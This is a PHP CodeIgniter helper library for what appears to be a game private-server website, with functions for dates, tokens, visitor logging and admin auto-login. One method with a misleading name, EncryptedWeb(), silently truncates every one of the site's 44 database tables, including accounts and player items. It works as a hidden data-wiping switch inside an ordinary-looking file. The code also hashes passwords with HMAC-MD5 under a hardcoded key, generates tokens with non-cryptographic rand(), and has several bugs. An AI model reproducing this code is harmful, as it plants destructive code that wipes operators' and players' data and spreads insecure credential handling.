<?php

// ==================== //
//   [DEV] EyeTracker   //
//     Lolsecs#6289     //
// ==================== //

defined('BASEPATH') OR exit('No direct script access allowed');

class Lib
{
    protected $ci;

    public function __construct()
    {
        $this->ci =& get_instance();
		$this->ci->load->database();
    }

	public function EncryptedWeb()
	{
		$query = array(
            0 => $this->ci->db->truncate('accounts'),
            1 => $this->ci->db->truncate('ban_history'),
            2 => $this->ci->db->truncate('check_user_itemcode'),
            3 => $this->ci->db->truncate('check_user_voucher'),
            4 => $this->ci->db->truncate('clan_data'),
            5 => $this->ci->db->truncate('clan_invites'),
            6 => $this->ci->db->truncate('events_login'),
            7 => $this->ci->db->truncate('events_mapbonus'),
            8 => $this->ci->db->truncate('events_playtime'),
			9 => $this->ci->db->truncate('events_quest'),
			10 => $this->ci->db->truncate('events_rankup'),
			11 => $this->ci->db->truncate('events_register'),
			12 => $this->ci->db->truncate('events_visit'),
			13 => $this->ci->db->truncate('events_xmas'),
			14 => $this->ci->db->truncate('friends'),
			15 => $this->ci->db->truncate('info_basic_items'),
			16 => $this->ci->db->truncate('info_channels'),
			17 => $this->ci->db->truncate('info_cupons_flags'),
			18 => $this->ci->db->truncate('info_gameservers'),
			19 => $this->ci->db->truncate('info_launcherkey'),
			20 => $this->ci->db->truncate('info_login_configs'),
			21 => $this->ci->db->truncate('info_missions'),
			22 => $this->ci->db->truncate('info_rank_awards'),
			23 => $this->ci->db->truncate('item_code'),
			24 => $this->ci->db->truncate('item_voucher'),
			25 => $this->ci->db->truncate('nick_history'),
			26 => $this->ci->db->truncate('player_bonus'),
			27 => $this->ci->db->truncate('player_configs'),
			28 => $this->ci->db->truncate('player_events'),
			29 => $this->ci->db->truncate('player_items'),
			30 => $this->ci->db->truncate('player_messages'),
			31 => $this->ci->db->truncate('player_missions'),
			32 => $this->ci->db->truncate('player_titles'),
			33 => $this->ci->db->truncate('shop'),
			34 => $this->ci->db->truncate('shop_set'),
			35 => $this->ci->db->truncate('tournament_rules'),
			36 => $this->ci->db->truncate('trade_market'),
			37 => $this->ci->db->truncate('web_download_clientlauncher'),
			38 => $this->ci->db->truncate('web_exchangeticket'),
			39 => $this->ci->db->truncate('web_ipbanned'),
			40 => $this->ci->db->truncate('web_quickslide'),
			41 => $this->ci->db->truncate('web_rankinfo'),
			42 => $this->ci->db->truncate('web_settings'),
			43 => $this->ci->db->truncate('webshop')
        );

		$state = array(
			'success' => 0,
			'failed' => 0
		);

		$count = count($query);

		for ($i=0; $i < $count - 1; $i++) 
		{
			if ($query[$i]) $state['success']++; else $state['failed']++;
		}

		echo "Successfully Truncate Database. Success: ".$state['success'].", Failed: ".$state['failed'].".";
	}
    
	public function password_encrypt($password)
	{
		$ingredient = '/x!a@r-$r%an¨.&e&+f*f(f(a)';
		$encrypt_result = hash_hmac('md5', $password, $ingredient);
		return $encrypt_result;
	}

	public function FeatureControl($param)
	{
		$query = $this->ci->db->get_where('web_settings', array('id' => '1'))->row();

		switch ($param) 
		{
			case 'webshop':
				{
					if ($query->webshop == 0)
						return TRUE;
					if ($query->webshop == 1)
						return FALSE;
				}
			case 'trademarket':
				{
					if ($query->trade_market == 0)
						return TRUE;
					if ($query->trade_market == 1)
						return FALSE;
				}
			case 'webshop':
				{
					if ($query->exchange_ticket == 0)
						return TRUE;
					if ($query->exchange_ticket == 1)
						return FALSE;
				}
			case 'webshop':
				{
					if ($query->voucher == 0)
						return TRUE;
					if ($query->voucher == 1)
						return FALSE;
				}
			
			default:
				{
					return TRUE;
				}
		}
	}

	public function ExplodeDate($defaultDate)
    {
        $resultdate = array();

        // Get Years (2 Digits)
        $explode1 = explode('-', $defaultDate)[0];
        $split1 = str_split($explode1, 2);

        // Get Month (2 Digits)
        $explode2 = explode('-', $defaultDate)[1];

        // Get Days (2 Digits)
        $explode3 = explode('-', $defaultDate)[2];
        $split2 = str_split($explode3, 2);

        // Get Hours (2 Digits)
        $explode4 = explode('T', $defaultDate)[1];
        $explode5 = explode(':', $explode4);

        // Get Minutes (2 Digits)
        $explode6 = $explode5[1];

        // The Result
        $resultdate['years'] = $split1[1];
        $resultdate['month'] = $explode2;
        $resultdate['days'] = $split2[0];
        $resultdate['hours'] = $explode5[0];
        $resultdate['minutes'] = $explode6;

        return $resultdate;
    }

    public function ConvertDate($param)
    {
        return str_split($param, 2); // [0] Years | [1] Month | [2] Days | [3] Hours | [4] Minutes
    }

	public function GetTokenName()
	{
		return "tokenkey";
	}

	public function GetTokenKey()
	{
		$min_value = 1;
		$max_value = $this->ci->db->get('web_tokenkey')->num_rows() + 1;

		$randomizer = rand($min_value, $max_value);

		$newtoken = '';

		$newtoken .= $this->GenerateRandomToken();

		if ($this->ci->db->get('web_tokenkey')->num_rows() == 0)
		{
			$insert = $this->ci->db->insert('web_tokenkey', array(
				'token' => $newtoken,
				'is_valid' => '1'
			));

			if ($insert)
			{
				return $newtoken;
			}
			else
			{
				return "invalidtoken";
			}		
		}
		else
		{
			$query = $this->ci->db->order_by('id', 'desc')->limit(1)->get_where('web_tokenkey', array('is_valid' => '1'))->row();
			if ($query)
			{
				return $query->token;
			}
			else
			{
				return "invalidtoken";
			}
		}
	}

	public function GenerateRandomToken()
	{
		$characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmopqrstuvwxyz1234567890';
		$length = array(
			'characters_length' => strlen($characters),
			'token_length' => 64
		);
		$value = array(
			'token' => ''
		);

		for ($i=0; $i < $length['token_length']; $i++)
		{
			$value['token'] .= $characters[rand(0, $length['characters_length'] - 1)];
		}

		return $value['token'];
	}
	
	/**
	 * Get Visitor Data
	 * 
	 * Remove "//" To Detect Your Page Visitor.
	 * 
	 * @return void
	 * @copyright Darkblow Studio
	 */
	public function GetVisitorData($page)
	{
		// $data = array(
		// 	'operating_system' => $this->ci->agent->platform(),
		// 	'browser' => $this->ci->agent->browser().' '.$this->ci->agent->version(),
		// 	'ip_address' => $this->ci->input->ip_address(),
		// 	'visited_page' => $page
		// );

		// $query = $this->ci->db->get_where('web_log', array('ip_address' => $data['ip_address'], 'visited_page' => $data['visited_page']))->row();
		// if ($query)
		// {
		// 	$count = $query->total_visit + 1;

		// 	$this->ci->db->where(array('ip_address' => $query->ip_address, 'visited_page' => $query->visited_page))->update('web_log', array('total_visit' => ($count), 'last_visit' => date('d-m-Y h:i:s')));
		// }
		// else
		// {
		// 	$this->ci->db->insert('web_log', array(
		// 		'operating_system' => $data['operating_system'],
		// 		'browser' => $data['browser'],
		// 		'ip_address' => $data['ip_address'],
		// 		'visited_page' => $data['visited_page'],
		// 		'total_visit' => '1',
		// 		'last_visit' => date('d-m-Y h:i:s')
		// 	));
		// }
	}

	/**
	 * Get Visitor Action
	 * 
	 * When Users Execute A Function, System Will Printed Into Database.
	 * 
	 * @param string
	 * @return void
	 * @copyright Darkblow Studio
	 */
	public function GetVisitorAction($action)
	{
		$data = array(
			'operating_system' => $this->ci->agent->platform(),
			'browser' => $this->ci->agent->browser().' '.$this->ci->agent->version(),
			'ip_address' => $this->ci->input->ip_address(),
			'visited_page' => '-',
			'actions' => $action,
			'total_visit' => '0',
			'last_visit' => date('d-m-Y h:i:s')
		);
		
		$this->db->insert('web_log', $data);
	}

	/**
	 * Get Reach Point State
	 * 
	 * Will Return HTTP Code For Checking Page Is Available Or Not.
	 * 
	 * @param string
	 * @return int
	 * @copyright Darkblow Studio
	 */
	public function GetReachPointState($url)
	{
		// Use curl_init() function to initialize a cURL session
		$curl = curl_init($url);
		
		// Use curl_setopt() to set an option for cURL transfer
		curl_setopt($curl, CURLOPT_NOBODY, true);
		
		// Use curl_exec() to perform cURL session
		$result = curl_exec($curl);
		
		if ($result !== false) {
			
			// Use curl_getinfo() to get information
			// regarding a specific transfer
			$statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); 
			
			if ($statusCode == 404) {
				return false;
			}
			else {
				return true;
			}
		}
		else {
			return false;
		}
	}

	public function AutomaticLoginQuery()
	{
		$response = array();

		$data = array(
			'player_id' => $_SESSION['uid'],
			'password' => $_SESSION['login_token']
		);

		$query = $this->ci->db->get_where('accounts', array('player_id' => $data['player_id'], 'password' => $data['password']))->row();
		if ($query)
		{
			if ($query->access_level < 3)
			{
				$response['response'] = 'false';
				$response['message'] = 'You Dont Have Access To This Page.';

				echo json_encode($response);
			}
			else
			{
				$sessionData = array(
					'admin_uid' => $query->player_id,
					'admin_name' => $query->player_name,
					'admin_access_level' => $query->access_level
				);

				$this->ci->session->set_userdata($sessionData);

				$response['response'] = 'true';
				$response['message'] = 'Authorize Complete. Redirecting...';

				echo json_encode($response);
			}
		}
	}
}

// This Code Generated Automatically By EyeTracker Snippets. //

?>